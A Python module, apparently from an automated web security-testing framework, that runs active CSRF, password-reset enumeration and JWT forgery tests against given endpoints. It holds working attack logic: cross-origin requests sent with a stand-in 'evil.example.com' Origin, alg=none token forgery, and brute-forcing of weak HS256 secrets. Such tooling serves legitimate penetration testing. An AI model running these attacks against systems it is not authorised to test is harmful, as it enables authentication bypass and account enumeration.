from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Optional

import httpx

from multi_agent_system.framework.types import EndpointSpec


def _origin_of(url: str) -> str:
    from urllib.parse import urlparse
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"


@dataclass
class FlowResult:
    success: bool
    proof_type: str
    evidence: dict[str, Any] = field(default_factory=dict)
    severity: str = "info"


@dataclass
class SessionRef:
    """Reference to an authenticated session for flow testing."""
    cookies: dict[str, str] = field(default_factory=dict)
    jwt_token: Optional[str] = None
    auth_headers: dict[str, str] = field(default_factory=dict)


class ActiveFlowTester:
    """Generic multi-step active flow tests (CSRF, password reset, JWT).

    Endpoint info passed in from caller (typically from endpoint_inventory).
    No hardcoded paths.
    """

    EVIL_ORIGIN = "http://evil.example.com"

    def __init__(self, jwt_wordlist_path: Optional[str] = None):
        self.jwt_wordlist_path = jwt_wordlist_path

    async def test_csrf(
        self, endpoint: EndpointSpec, session: SessionRef,
    ) -> FlowResult:
        """Compare same-origin vs cross-origin request behavior.

        Reportable when cross-origin request succeeds with state change identical
        to same-origin baseline.
        """
        client = getattr(self, "_http_client", None) or httpx.AsyncClient(
            timeout=15, follow_redirects=False, verify=False,
        )
        method = endpoint.method.upper()
        body = {"_csrf_test": "1"}

        same_origin_headers = {"Origin": _origin_of(endpoint.url),
                                "Referer": endpoint.url}
        if session.auth_headers:
            same_origin_headers.update(session.auth_headers)
        try:
            resp_a = await client.request(
                method, endpoint.url, json=body, headers=same_origin_headers,
                cookies=session.cookies,
            )
        except httpx.RequestError as exc:
            return FlowResult(success=False, proof_type="error",
                               evidence={"error": str(exc)}, severity="info")

        cross_headers = {"Origin": self.EVIL_ORIGIN,
                          "Referer": self.EVIL_ORIGIN}
        if session.auth_headers:
            cross_headers.update(session.auth_headers)
        try:
            resp_b = await client.request(
                method, endpoint.url, json=body, headers=cross_headers,
                cookies=session.cookies,
            )
        except httpx.RequestError as exc:
            return FlowResult(success=False, proof_type="error",
                               evidence={"error": str(exc)}, severity="info")

        if 200 <= resp_a.status_code < 300 and 200 <= resp_b.status_code < 300:
            if abs(len(resp_a.text) - len(resp_b.text)) < max(50, len(resp_a.text) * 0.1):
                return FlowResult(
                    success=True, proof_type="verified_state_change",
                    severity="high",
                    evidence={
                        "endpoint": endpoint.url, "method": method,
                        "request_a_origin": same_origin_headers["Origin"],
                        "request_b_origin": self.EVIL_ORIGIN,
                        "response_a_status": resp_a.status_code,
                        "response_b_status": resp_b.status_code,
                        "impact": "Cross-origin POST accepted without CSRF token",
                    },
                )

        return FlowResult(
            success=False, proof_type="non_exploitable",
            severity="info",
            evidence={"a_status": resp_a.status_code, "b_status": resp_b.status_code},
        )

    async def test_password_reset(
        self,
        endpoint: EndpointSpec,
        valid_identity: str = "admin@example.test",
        invalid_identity: str = "noexist-xxxxx@example.test",
    ) -> FlowResult:
        """Probe response diff between valid vs invalid identity.

        Significant diff (status, length, keyword) -> user enumeration finding.
        Caller passes a hint identity; if unknown, function still runs with
        common default that should never be a real account.
        """
        client = getattr(self, "_http_client", None) or httpx.AsyncClient(
            timeout=15, verify=False,
        )
        param = endpoint.params[0] if endpoint.params else "email"
        try:
            resp_valid = await client.request(
                endpoint.method.upper(), endpoint.url,
                json={param: valid_identity},
            )
            resp_invalid = await client.request(
                endpoint.method.upper(), endpoint.url,
                json={param: invalid_identity},
            )
        except httpx.RequestError as exc:
            return FlowResult(success=False, proof_type="error",
                               evidence={"error": str(exc)}, severity="info")

        diff_status = resp_valid.status_code != resp_invalid.status_code
        diff_body = abs(len(resp_valid.text) - len(resp_invalid.text)) > 20
        # Look for revealing keywords
        valid_text = (resp_valid.text or "").lower()
        invalid_text = (resp_invalid.text or "").lower()
        keyword_diff = any(
            kw in valid_text and kw not in invalid_text
            for kw in ("sent", "exist", "found", "user", "account")
        )

        if diff_status or diff_body or keyword_diff:
            return FlowResult(
                success=True, proof_type="data_exposure",
                severity="medium",
                evidence={
                    "endpoint": endpoint.url, "method": endpoint.method,
                    "valid_status": resp_valid.status_code,
                    "invalid_status": resp_invalid.status_code,
                    "valid_length": len(resp_valid.text),
                    "invalid_length": len(resp_invalid.text),
                    "issue": "User enumeration via password recovery response diff",
                    "impact": "Attacker can determine which accounts exist",
                },
            )
        return FlowResult(success=False, proof_type="non_exploitable", severity="info",
                           evidence={"reason": "no significant diff"})

    async def test_jwt_manipulation(
        self,
        token: str,
        target_endpoint: EndpointSpec,
    ) -> FlowResult:
        """Try alg=none + weak-secret brute against `target_endpoint` using `token`.

        Reportable when server accepts a forged token (state-changing access).
        """
        import base64 as _b64
        import json as _json
        try:
            import jwt as _jwt
        except ImportError:
            return FlowResult(success=False, proof_type="error",
                               evidence={"error": "PyJWT not installed"}, severity="info")
        client = getattr(self, "_http_client", None) or httpx.AsyncClient(
            timeout=15, verify=False,
        )

        # Parse original token payload (no verify -- exploratory)
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return FlowResult(success=False, proof_type="error",
                                   evidence={"error": "not a JWT"}, severity="info")
            payload_raw = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = _json.loads(_b64.urlsafe_b64decode(payload_raw))
        except Exception as exc:
            return FlowResult(success=False, proof_type="error",
                               evidence={"error": f"parse failed: {exc}"},
                               severity="info")

        # Attack 1: alg=none
        unsigned_header = _b64.urlsafe_b64encode(
            _json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        unsigned_payload = _b64.urlsafe_b64encode(
            _json.dumps(payload).encode()
        ).rstrip(b"=").decode()
        unsigned_token = f"{unsigned_header}.{unsigned_payload}."

        try:
            resp = await client.request(
                target_endpoint.method.upper(), target_endpoint.url,
                headers={"Authorization": f"Bearer {unsigned_token}"},
            )
            if 200 <= resp.status_code < 300:
                return FlowResult(
                    success=True, proof_type="exploit_success", severity="critical",
                    evidence={
                        "endpoint": target_endpoint.url,
                        "technique": "alg=none",
                        "forged_token": unsigned_token[:80] + "...",
                        "response_status": resp.status_code,
                        "impact": "Server accepts unsigned JWT -- full auth bypass",
                    },
                )
        except httpx.RequestError:
            pass

        # Attack 2: weak-secret brute (top-N from wordlist if available)
        weak_secrets = ["secret", "password", "123456", "admin", "key", "jwt"]
        if self.jwt_wordlist_path:
            try:
                from pathlib import Path
                lines = Path(self.jwt_wordlist_path).read_text(
                    encoding="utf-8", errors="ignore"
                ).splitlines()
                weak_secrets = [ln.strip() for ln in lines[:1000] if ln.strip()]
            except OSError:
                pass

        for candidate in weak_secrets:
            try:
                forged = _jwt.encode(payload, candidate, algorithm="HS256")
                resp = await client.request(
                    target_endpoint.method.upper(), target_endpoint.url,
                    headers={"Authorization": f"Bearer {forged}"},
                )
                if 200 <= resp.status_code < 300:
                    return FlowResult(
                        success=True, proof_type="exploit_success", severity="critical",
                        evidence={
                            "endpoint": target_endpoint.url,
                            "technique": f"weak-secret (candidate={candidate})",
                            "response_status": resp.status_code,
                            "impact": "JWT signed with guessable secret",
                        },
                    )
            except (httpx.RequestError, Exception):
                continue

        return FlowResult(success=False, proof_type="non_exploitable", severity="info",
                           evidence={"reason": "alg=none rejected; no weak secret matched"})
